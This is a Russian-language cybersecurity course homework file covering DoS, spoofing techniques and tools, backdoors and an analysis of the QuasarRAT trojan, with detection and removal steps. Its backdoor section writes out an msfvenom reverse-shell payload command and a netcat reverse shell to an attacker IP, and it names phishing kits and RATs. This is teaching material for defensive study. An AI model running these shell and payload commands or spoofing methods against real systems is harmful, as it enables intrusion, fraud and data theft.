# Cyb07-onl

## 8. Типы атак, часть 2

### Дата и время занятия
Вторник, 7 Октябрь, 19:00-22:00

### Описание занятия
- Спам, боты
- DDoS
- Brute-force
- MITM
- Spoofing
- Виды вирусов и бэкдоров
- Делаем примитивный брутфорс на Kali

### Домашнее задание
 #### 1. Провести DOS атаку на приложение juice shop, ссылка на инструмент - https://github.com/XCHADXFAQ77X/XERXES


 #### 2. Найти в интернете программы или средства, с помощью которых можно совершить спуфинг.
  Спуфинг (от англ. spoofing — «подделка») — это техника, при которой злоумышленник имитирует доверенную сущность, чтобы ввести в заблуждение систему или пользователя. Ниже приведено подробное описание типов спуфинга, а также примеры инструментов, которые могут использоваться для их реализации — только в образовательных и легальных целях (например, при тестировании безопасности с разрешения).

  1. Подмена номера (Caller ID Spoofing): подделка номера телефона, отображаемого на экране абонента при входящем звонке.
    Цель:
      - Фишинг (например, имитация банка или службы поддержки).
      - Обход систем, основанных на доверии к номеру.
      - Социальная инженерия.
    Примеры средств:
      - SpoofCard, CallerID Faker, Phoner — коммерческие сервисы (некоторые легальны в определённых юрисдикциях для бизнеса).
      - Asterisk + SIP-провайдер — с помощью настройки SIP-заголовков (From, P-Asserted-Identity).
      - SIPVicious — набор инструментов для тестирования VoIP-безопасности (включает спуфинг вызовов).
    !!! В США и многих других странах подмена номера незаконна, если используется с мошенническими целями (закон TRACED Act). 

  2. Подмена сайта (Website Spoofing / Phishing): создание поддельной копии легитимного веб-сайта (например, банка, Google, соцсети) для кражи учётных данных.
    Цель:
      - Кража логинов, паролей, 2FA-кодов.
      - Установка вредоносного ПО через поддельные «обновления».
    Примеры средств:
      - SocialFish, Zphisher, HiddenEye — фреймворки для генерации фишинговых страниц.
      - HTTrack — клонирование сайтов.
      - Evilginx2 — продвинутый фишинг с обходом 2FA через прокси-атаку (MITM).
    Защита: Проверка URL, HTTPS (но не гарантирует легитимность!), двухфакторная аутентификация с аппаратными ключами (FIDO2). 

  3. Подмена почты (Email Spoofing): отправка письма с поддельного адреса отправителя (например, ceo@ваша-компания.ru).
    Цель:
      - BEC (Business Email Compromise) — мошенничество с переводом денег.
      - Распространение фишинга или вредоносных вложений.
    Как работает:
      - SMTP-протокол изначально не проверяет подлинность отправителя. Злоумышленник может указать любой From:.
    Примеры средств:
      - SendEmail, Swaks — утилиты командной строки для отправки поддельных писем.
      - Metasploit (модуль smtp_email spoof).
      - Скрипты на Python с использованием библиотеки smtplib.
    Защита: SPF, DKIM, DMARC — DNS-записи, проверяющие подлинность отправителя. 

  4. IP-спуфинг (IP Spoofing): подделка IP-адреса источника в IP-пакете.
    Цель:
      - Анонимизация при DDoS-атаках.
      - Обход ACL (списков контроля доступа), основанных на IP.
      - Проведение MITM- или DoS-атак (например, SYN flood).
    Примеры средств:
      - Scapy (Python) — гибкая генерация пакетов с любыми заголовками.
      - hping3 — утилита для отправки поддельных TCP/UDP/ICMP-пакетов.
      - Nmap (с опцией -S для подмены источника — но требует root и знания маршрутизации).
    !!! Метод эффективен в основном в локальных сетях или при атаках без ответа (например, flood). В интернете ответные пакеты уйдут на поддельный IP и не вернутся. 

  5. SMS-спуфинг (SMS-Spoofing): отправка SMS с поддельного номера или имени отправителя.
    Цель:
      - Фишинг («Ваш пакет задержан — перейдите по ссылке»).
      - Имитация уведомлений от банков, служб доставки.
    Примеры средств:
      - SMSSpamBot, SMS Gateway API (через уязвимые SMS-шлюзы).
      - Онлайн-сервисы (например, некоторые SMS-рассыльщики позволяют указать «Sender ID» — но в большинстве стран это регулируется).
      - Kali Linux + GSM-модем с ПО вроде SMSTools или Gammu (для локального спуфинга в GSM-сетях — требует оборудования).
    !!! Во многих странах подмена SMS-отправителя запрещена законом. 

  6. DNS-спуфинг (DNS Cache Poisoning): подмена DNS-ответа, чтобы перенаправить жертву на поддельный IP-адрес (например, bank.ru → сервер злоумышленника).
    Цель:
      - Перехват трафика.
      - Фишинг на уровне сети.
      - Установка backdoor при обновлении ПО.
    Примеры средств:
      - Ettercap — с плагином dns_spoof.
      - dnsmasq — локальный DNS-сервер, который можно настроить на подмену.
      - BetterCAP — современный MITM-фреймворк с DNS-спуфингом.
    Защита: DNSSEC, использование DNS-over-HTTPS (DoH) или DNS-over-TLS (DoT). 

  7. ARP-спуфинг (ARP Poisoning): отправка поддельных ARP-пакетов в локальной сети для связывания MAC-адреса злоумышленника с IP-адресом жертвы или шлюза.
    Цель:
      - MITM-атака (перехват, модификация трафика).
      - Отключение жертвы от сети (DoS).
    Примеры средств:
      - Ettercap — классический инструмент для ARP-спуфинга.
      - Arpspoof (из пакета dsniff).
      - BetterCAP — более современная альтернатива.
    Защита: статические ARP-записи, DHCP snooping, ARP inspection на коммутаторах, использование IPsec. 

  8. Extension-спуфинг (или File Extension Spoofing): Маскировка вредоносного файла под безобидный.
    Цель:
      - Обман пользователя, чтобы он запустил вредоносный .exe, думая, что это PDF или DOC.
    Примеры:
      - Ручное переименование файла с пробелом или символами: document.pdf .exe отображается в Windows без .exe по умолчанию.
      - Использование Unicode-символов (Right-to-Left Override - RLO): Файл exe.‮cod.exe отображается как exe.doc.exe.
    Защита: 
      - Включить отображение всех расширений файлов в Windows.
      - Использовать антивирусы с эвристикой.
      - Не запускать файлы из ненадёжных источников.
   
 #### 3. Что такое backdoor, какие программы позволяют создавать данный тип?

  Backdoor (в переводе с английского — «чёрный ход») — это скрытый способ обхода обычных процедур аутентификации или авторизации в программном обеспечении, системе или устройстве. 
  Backdoor может быть заложен намеренно разработчиком, внедрён злоумышленником или возникнуть как непреднамеренная уязвимость.

  Основные типы backdoor:
    - Намеренные (закладки). Разработчики иногда оставляют backdoor для упрощения технической поддержки или отладки. Однако если такая «дверь» становится известна злоумышленникам, она может быть использована для несанкционированного доступа.
    - Вредоносные backdoor. Устанавливаются хакерами после первоначального взлома системы. Такие backdoor позволяют злоумышленникам сохранять доступ к системе даже после устранения первоначальной уязвимости.
    - Аппаратные backdoor. Редко, но возможны в микросхемах или сетевом оборудовании. Такие backdoor крайне трудно обнаружить и устранить.

  Примеры использования backdoor:
    - Удалённое управление заражённым компьютером (например, через троянские программы типа RAT — Remote Access Trojan).
    - Обход двухфакторной аутентификации.
    - Сбор конфиденциальных данных без ведома пользователя.
  
  Причины опасности:
    - Позволяют обойти защиту системы.
    - Могут долгое время оставаться незамеченными.
    - Используются для кражи данных, шпионажа, распространения вредоносного ПО и других злонамеренных действий.

  Основные способы защиты:
    - Регулярное обновление ПО и операционных систем.
    - Использование антивирусов и систем обнаружения вторжений (IDS/IPS).
    - Регулятрое проведение аудита кода и систем на наличие подозрительной активности.
    - Ограничение привилегий пользователей (следование принципу наименьших привилегий).

  Примеры программ, позволяющих создавать и эксплуатировать backdor:
    1. Metasploit Framework
      Назначение: Платформа для разработки, тестирования и использования эксплойтов.
      Backdoor-возможности: Позволяет создавать payload'ы (полезную нагрузку), например:
        msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f exe -o backdoor.exe
      этот .exe-файл при запуске на атакуемом хосте подключится к атакующему и предоставит удалённый доступ (reverse shell)

      Законное использование: Только тестовых, обучающих системах, или на системах, где у вас есть письменное разрешение.

    2. Netcat (и его модификации, например, Ncat)
      Простой способ создать reverse shell:
        # На атакующем хосте:
        nc -lvnp 4444
        # На атакуемом хосте (если есть доступ к командной строке, например через exploit в Metasploit Framework):
        nc 192.168.1.10 4444 -e /bin/bash
        
        Данный пример не полноценный backdoor, но может быть его частью.

    3. Cobalt Strike
      Это коммерческий инструмент для red team'ов (имитация атак). Позволяет создавать Beacon — скрытый backdoor с шифрованием, обходом AV и т.д. Широко используется в корпоративных пентестах (но часто также в злонамеренных целях из-за утечек).

    4. Sliver
      Современный open-source фреймворк от Bishop Fox. Поддерживает C2 (Command & Control), шифрование, обход EDR и создание backdoor-агентов для Windows, Linux, macOS. 

    5. Злонамеренные программы (трояны с backdoor)
      Эти программы не предназначены для легального использования и часто распространяются киберпреступниками:
        DarkComet, njRAT, Loki RAT, QuasarRAT, NanoCore
      Такие программы часто маскируются под легальное ПО и используются для кражи паролей, записи с веб-камеры, удалённого управления и т.д.   

 #### 4. Провести анализ любого трояна (описать его распространение, что делает после заражения, как его обнаружить и устранить)
    Рассмотрим в качестве примера троян QuasarRAT — один из широко распространённых удалённых троянов-администрирования (Remote Access Trojan, RAT).
    QuasarRAT — типичный пример современного RAT: простой в использовании, мощный в возможностях и опасный при неосторожном поведении пользователя. Хотя он создавался как open-source проект для обучающих целей, на практике стал инструментом киберпреступников.

    Анализ трояна QuasarRAT:
    1. Общая информация
      Тип: Remote Access Trojan (RAT)
      Платформа: Windows (основная цель), хотя существуют модификации для других ОС.
      Открытый исходный код: Да (размещён на GitHub до удаления по запросу правообладателей).
      Язык: C# (.NET)
      Цель: Полный удалённый контроль над заражённой системой.
    
    2. Способы распространения
      QuasarRAT распространяется не сам по себе, а через другие вредоносные методы:
        - Фишинговые письма: Вложение с якобы «счетом», «резюме» или «фото» (файл .exe, .scr, .zip с exe внутри).
        - Поддельные установщики ПО: Например, «взломанные» версии популярных программ (Photoshop, игры и т.д.).
        - Социальная инженерия: Жертве предлагают «скачать полезную утилиту», которая на самом деле — троян.
        - Упаковка в легитимные файлы: Через инструменты вроде MyBinder или Bat to Exe Converter, чтобы обойти антивирусы.
      Часто используется обфускация и упаковка (packing) для сокрытия вредоносного кода от сигнатурного анализа. 

    3. Действия после заражения и запуска:
      Устанавливает соединение с C2-сервером (Command & Control)
        - Подключается к IP-адресу или домену, указанному злоумышленником.
        - Использует TCP или HTTP(S) (в более новых версиях).
        - Может использовать шифрование (AES) для скрытия трафика.
      Предоставляет злоумышленнику полный контроль:
        - Просмотр и загрузка файлов.
        - Удалённое выполнение команд (через CMD или PowerShell).
        - Запись с микрофона и веб-камеры.
        - Кража паролей из браузеров, мессенджеров, FTP-клиентов.
        - Логирование нажатий клавиш (keylogging).
        - Запуск других вредоносных программ (dropper).
        - Создание персистентности (автозагрузка при старте системы через реестр Windows или папку автозагрузки).

    4. Особенности:
      - Лёгкий и модульный — можно включать/выключать функции.
      - Имеет графический интерфейс для злоумышленника (C2-панель).
      - Поддерживает управление сотнями заражённых машин одновременно.

    5. Признаки заражения:
      - Необычные процессы в диспетчере задач (например, svch0st.exe, update.exe — поддельные имена).
      - Неизвестные соединения в netstat -ano (особенно к внешним IP на нестандартных портах).
      - Антивирусные предупреждения о QuasarRAT, Quasar, Xrat, NanoCore и т.п.
      - Высокая активность сети при простое системы.
      - Файлы в %AppData%, %Temp% с подозрительными именами и временем создания.

    6. Инструменты для обнаружения:
      - Wireshark / TCPView: Анализ сетевого трафика на необычные подключения.
      - Process Explorer / Process Hacker: Проверка подозрительных процессов и их DLL.
      - Autoruns (от Microsoft Sysinternals): Проверка автозагрузки.
      - VirusTotal: Загрузка подозрительного файла для мульти-антивирусной проверки.
      - EDR/XDR-системы: Например, CrowdStrike, SentinelOne, Microsoft Defender for Endpoint — могут детектировать поведение RAT. QuasarRAT часто детектируется как Trojan.Quasar, Win32/QuasarRAT, RAT:Win32/Quasar, HEUR:Trojan.Win32.Generic.

    7. Устранение:
      - Отключить компьютер от интернета — чтобы прервать связь с C2.
      - Запустить сканирование антивирусными программами Microsoft Defender, Malwarebytes, Kaspersky, ESET, Bitdefender
      - Удалить автозагрузку через msconfig → автозагрузка, или через regedit:
          HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
          HKEY_LOCAL_MACHINE\...\Run
      - Удалить файлы трояна, обычно в %AppData%\Roaming\, %Temp%, или в папке с именем, похожим на системный процесс.
      - Сменить все пароли с чистого устройства (после полной очистки).
      - Обновить ОС и ПО — чтобы закрыть уязвимости, использованные для заражения.
    В тяжёлых случаях рекомендуется полная переустановка Windows :) (можно начать сразу с этого - будет быстрее)

    8. Профилактика заражения:
      - Не открывать .exe-файлы из ненадёжных источников.
      - Всегда использовать антивирус с поведенческим анализом (не только сигнатурами).
      - Отключить автозапуск макросов в Office.
      - Регулярно обновлять Windows и приложения.

 #### 5. Пройти лабу https://tryhackme.com/room/layer2

